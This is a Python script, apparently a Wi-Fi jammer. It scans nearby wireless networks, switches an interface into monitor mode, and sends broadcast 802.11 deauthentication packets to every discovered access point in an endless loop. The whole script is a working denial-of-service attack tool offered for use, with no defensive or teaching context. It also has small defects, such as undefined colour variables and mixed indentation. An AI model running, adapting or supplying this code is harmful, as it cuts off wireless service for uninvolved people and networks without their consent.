#!/usr/bin/python

from scapy.all import *
from wifi import Cell
import time
import wireless
import os
from subprocess import Popen, PIPE

DN = open(os.devnull, 'w')

# Network scanner
def network_scan():
    wifi_card = wireless.Wireless()
    interface = wifi_card.interface()
    wifi_collect = Cell.all(interface)
    print ("Available networks scan in progress ...")
    print ("#" * 70)
    bssid = []
    time.sleep(2)
    for wi in wifi_collect:
		 print "SSID     : "  +    wi.ssid 
		 print "BSSID    : "  +    wi.address
		 print "Channel  : "  +    str(wi.channel)
		 print "Quality  : "  +    str(wi.quality)
		 print "+-" * 10
		 bssid.append(wi.address)
		 time.sleep(0.5)
    print "#" * 70
    return bssid

# Monitor mode setting 
def get_mon_iface():
    global monitor_on
    monitors, interfaces = iwconfig()
    if len(monitors) > 0:
        monitor_on = True
        return monitors[0]
    else:
        # Start monitor mode on a wireless interface
        interface = get_iface(interfaces)
        monmode = start_mon_mode(interface)
        return monmode

def iwconfig():
    monitors = []
    interfaces = {}
    try:
        proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    except OSError:
        sys.exit('['+R+'-'+W+'] Could not execute "iwconfig"')
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Isn't an empty string
        if line[0] != ' ': # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search: # Isn't wired
                iface = line[:line.find(' ')] # is the interface
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    return monitors, interfaces

def get_iface(interfaces):
    scanned_aps = []

    if len(interfaces) < 1:
        sys.exit('['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
    if len(interfaces) == 1:
        for interface in interfaces:
            return interface

    # Find most powerful interface
    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if ' - Address:' in line: # first line in iwlist scan for a new AP
               count += 1
        scanned_aps.append((count, iface))
        print '['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W
    try:
        interface = max(scanned_aps)[1]
        return interface
    except Exception as e:
        for iface in interfaces:
            interface = iface
            print '['+R+'-'+W+'] Minor error:',e
            print '    Starting monitor mode on '+G+interface+W
            return interface

def start_mon_mode(interface):
    try:
        os.system('ip link set %s down' % interface)
        os.system('iwconfig %s mode monitor' % interface)
        os.system('ip link set %s up' % interface)
        return interface
    except Exception:
        sys.exit('['+R+'-'+W+'] Could not start monitor mode')

# Deauth packets sending
def jam(address):
	 mon_iface = get_mon_iface()
	 conf.iface = mon_iface
	 bssid = address   
	 client = "FF:FF:FF:FF:FF:FF" # Broadcast
	 count = 5 # number of sent Deauth packets per BSSID
	 conf.verb = 0  # shut up Scapy
	 packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
	 for n in range(int(count)):
		sendp(packet)
		print 'Deauth packet '+ str(n)  +  ' sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client

if __name__ == "__main__":
	bssid = network_scan()
	while 1:
		for item in bssid: 
	 		print "Jamming on : {0}".format(item)
			jam(item)
